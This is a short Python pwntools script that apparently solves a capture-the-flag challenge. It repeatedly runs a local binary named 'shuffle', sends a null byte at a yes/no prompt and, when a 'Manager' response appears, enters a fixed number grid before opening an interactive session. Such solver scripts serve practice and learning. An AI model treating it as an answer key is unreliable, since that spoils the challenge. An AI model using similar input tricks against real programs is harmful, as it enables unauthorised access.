from pwn import *

exe='./shuffle'

elf = context.binary = ELF(exe,checksec=False);
context.log_level = 'warn'

for _ in range(1000):
    p = process()
    p.sendlineafter(b'y/n: ',b'\x00')
    res = p.recv()
    print(b'RES: '+res)
    if(b'Manager' in res):
        p.sendline(b'14 4 1 0')
        p.sendline(b'8 10 15 3')
        p.sendline(b'12 9 2 5')
        p.sendline(b'7 6 13 11')
        p.interactive();
        exit();
    p.close();
